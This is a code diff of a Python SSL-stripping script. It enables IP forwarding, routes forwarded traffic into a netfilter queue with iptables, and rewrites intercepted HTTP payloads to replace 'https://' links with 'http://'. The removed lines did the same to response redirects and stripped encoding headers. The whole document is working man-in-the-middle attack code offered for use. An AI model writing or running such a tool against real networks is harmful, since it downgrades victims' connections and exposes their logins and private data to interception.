@@ -1,44 +1,46 @@
-#import netfilterqueue
 from scapy.all import *
-import re
 import os
 from netfilterqueue import NetfilterQueue
+import re
 
 def process_packet(packet):
+    print("[+] Packet intercepted...")
+
+    # Convert packet to scapy packet
     scapy_packet = IP(packet.get_payload())
 
-    if scapy_packet.haslayer(Raw):
-        load = scapy_packet[Raw].load.decode(errors="ignore")
-        if scapy_packet.haslayer(TCP):
-            if scapy_packet[TCP].dport == 80:
-                print("[+] Request")
-                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-
-            elif scapy_packet[TCP].sport == 80:
-                print("[+] Response")
-                load = re.sub("Location: https://", "Location: http://", load)
-
-        if load != scapy_packet[Raw].load:
-            scapy_packet[Raw].load = load
+    # Check if packet is a HTTP request
+    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
+        if scapy_packet[TCP].dport == 80:
+            print("[+] HTTP Request...")
+            load = scapy_packet[Raw].load.decode()
+            load = re.sub('https://', 'http://', load)
+            scapy_packet[Raw].load = load.encode()
             del scapy_packet[IP].len
             del scapy_packet[IP].chksum
             del scapy_packet[TCP].chksum
             packet.set_payload(bytes(scapy_packet))
 
+    # Accept packet
     packet.accept()
 
-def ssl_strip(interface):
-    os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
-    #queue = netfilterqueue.NetfilterQueue()
+def start():
+    # Enable IP forwarding
+    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
+
+    # Set up iptables rule
+    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
+
+    # Set up packet queue
     queue = NetfilterQueue()
+    queue.bind(0, process_packet)
+
     try:
-        queue.bind(0, process_packet)
+        print("[+] Starting packet interception...")
         queue.run()
-    except Exception as e:
-        print("Error: {}".format(e))
+    except KeyboardInterrupt:
+        print("\n[-] Stopping packet interception...")
         queue.unbind()
-    finally:
-        os.system("iptables --flush")
 
 if __name__ == "__main__":
-    ssl_strip()
+    start()
